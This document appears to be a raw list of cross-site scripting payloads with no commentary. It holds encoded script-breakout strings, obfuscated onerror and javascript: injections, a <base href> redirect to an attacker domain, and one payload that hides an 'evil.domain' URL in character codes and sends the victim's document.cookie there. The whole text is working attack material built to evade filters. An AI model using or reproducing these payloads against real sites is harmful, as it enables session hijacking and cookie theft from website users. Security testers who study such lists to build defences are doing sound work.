```html
abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
```
```html
"><img src=1 onerror="url=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,100,111,109,97,105,110,47,99,46,112,104,112,63,99,61)+encodeURIComponent(document.cookie);xhttp=new XMLHttpRequest();xhttp.open('GET',url,true);xhttp.send()">
```
```html
<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;
```
```html
<iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;></iframe>
```
```html
"><img src=/ onerror=alert(document.domain)>
```
```html
[Click me](javascript:alert(1))
```
```html
<base href="https://your-evil-domain.com">
```
```html
">]<img src=x onerror=alert(document.domain)> ">]<img src=x onerror=alert(document.cookie)>
```
```html
%3CSVG/oNIY=1%20ONIOAD=confirm(document.domain)
```
```html
<img/src=x onError="` ${x}`;alert(` Hello*);">
```
```html
<a/href="j%0A%0Davascript: {var{3:s,2:h,5:a, 0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
```
```html
javascript:1&ReturnUrl=%2561%256c%2565%2572%2574%2528%2564%256f%25632575%256d%2565%256e%2574%252e%2564%256f%256d%2561%2569%256e%2529
```
```html
"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
```
